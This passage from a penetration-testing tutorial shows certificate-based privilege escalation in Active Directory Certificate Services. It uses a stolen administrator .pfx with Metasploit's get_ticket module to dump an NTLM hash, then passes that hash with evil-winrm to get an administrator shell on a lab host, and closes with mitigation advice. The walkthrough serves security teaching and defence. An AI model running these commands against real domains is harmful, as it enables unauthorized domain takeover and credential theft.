<p><span style="color: #000000;">Fire the command to rename :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv 20250112054501_default_192.168.1.48_windows.ad.cs_460247.pfx administrator.pfx</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrK1DwdgBm707ok41v_XM6G8G539vDSmaBaUZ3nCJpzCaCCUWjIrJ5kptofggmiaBLZRLiSPO_Fs6SyM3qp83MGPJEZKSapBzHfwAU7BLWAHYQvNM38M137SdwoBhL4x_qoxxFxywocs10-g92EGX13F9e77AvGC6x2o3wHUhYOB1uf93LUna_dBuNdvqW/s16000/23.png"/></span></p>
<ul>
<li>
<h5><strong><span style="color: #000000;">Use the Certificate</span></strong></h5>
</li>
</ul>
<p><span style="color: #000000;">The <strong>auxiliary/admin/kerberos/get_ticket</strong> module can be used to request TGT/TGS tickets from the KDC.</span></p>
<p><span style="color: #000000;">The following ACTIONS are supported:</span></p>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;"><strong>GET_TGT</strong>: legally request a TGT from the KDC given a password, a NT hash or an encryption key. The resulting TGT will be cached.</span></li>
<li><span style="color: #000000;"><strong>GET_TGS</strong>: legally request a TGS from the KDC given a password, a NT hash, an encryption key or a cached TGT. If the TGT is not provided, it will request it the same way the “TGT action” does. The resulting TGT and the TGS will be cached.</span></li>
</ul>
</li>
</ul>
<p><span style="color: #000000;">Use a .pfx file to <strong>authenticate as Administrator</strong> and get a <strong>Kerberos TGT</strong> you can later use with pass-the-ticket attacks.</span></p>
<p><span style="color: #000000;">Launch Metasploit: msfconsole</span></p>
<p><span style="color: #000000;">Load the Module and Set required Options:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use admin/kerberos/get_ticket
set cert_file /root/.msf4/loot/administrator.pfx
set rhosts 192.168.1.48
set action GET_HASH
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_yS7oGbBBPg0dx15xjhmuleFVFtiZoyhpDiRt7J0KkV7cNudQF7zeuxjoc7pUvm4t7b_clDLB5_FtohRVx3Un26ReNRjBqHRF4TZJ6RX00HenavRZOXo_hulEfXJWhrBDTfeI9IxLF0pP8BTH2lVo68K5dgMb3oAbI3124oyM9ti_OwvGWYF7AywRw0Sm/s16000/24.png"/></span></p>
<p><span style="color: #000000;">If the attack is successful, the system dumps the NTLM hash.</span></p>
<h4><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></h4>
<p><span style="color: #000000;">Use <strong>Evil-WinRM</strong> to get a shell as Administrator using the certificate-based authentication.</span></p>
<p><span style="color: #000000;">Fire up the command as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.48 -u administrator -H 32196b56ffe6f45e294117b91a83bf38</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUf1m9XFqtvQlKbsdpiR7RxZfYVBDkYzWGBR_Y5hQc4nXBZlvo75m19uwxiMd6FPHE7J_C7Nzs2J_kja0zEIqlGuzTFkLRN-AeML6VcTPkrxFyDCrlKIHE6DvrAv0gMMOxixtYK1CIoUEJJivmdJJ4P_nF1HVbIKHPMD8odAYEPBVawfuBvx__nJ2AmMos/s16000/25.png"/></span></p>
<h3><span style="color: #800000;">Mitigation</span></h3>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAhcUljMqf6W0Z8IFMjGKD-sFMsLV73uyxyZp_5Kkz8wknG1VKw3DSMe5Oh-bi08iGKkbNpCc59WBinf87qOE6_ryNY1qzsd0na2qHinA7Lqt5e13zVKGcsBjHsqaopLuSAIcX1NNuWIkbKip2CofV5Tz-qto1jzweiMS8kDwNZzOTbeSUPybZoy9arrW-/s16000/27.png"/></span></p>
<ol>
<li><span style="color: #000000;"><strong>Harden Certificate Templates</strong> → Disable ENROLLEE_SUPPLIES_SUBJECT and remove irrelevantClient Authentication EKUs</span></li>
<li><span style="color: #000000;"><strong>Restrict Enrollment Permissions</strong> → Grant Enroll and Autoenroll rights only to trusted users and groups</span></li>
<li><span style="color: #000000;"><strong>Disable or Remove Unused Templates</strong> → Unpublish legacy or not secure templates like “User”</span></li>
<li><span style="color: #000000;"><strong>Enable Manual Approvals</strong> → Require manager approval for sensitive certificate templates</span></li>
<li><span style="color: #000000;"><strong>Monitor Certificate Activity</strong> → Watch for Event IDs 4886 (request) and 4887 (issue) in security logs</span></li>
<li><span style="color: #000000;"><strong>Regular Vulnerability Scanning</strong> → Use Certipy and Metasploit to identify and fix template misconfigurations</span></li>
<li><span style="color: #000000;"><strong>Harden and Isolate ADCS Infrastructure</strong> → Patch, restrict network access, and disable unnecessary ADCS roles</span></li>
</ol>
<p><span style="color: #000000;"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/" title="AD Certificate Exploitation: ESC1">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">AD Certificate Exploitation: ESC1</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" title="ADCS ESC4: Vulnerable Certificate Template Access Control">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC4: Vulnerable Certificate Template Access Control</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/sapphire-ticket-attack-abusing-kerberos-trust/" rel="prev">Sapphire Ticket Attack: Abusing Kerberos Trust</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" rel="next">ADCS ESC3: Enrollment Agent Template</a></div></div>
	</nav>        </div>
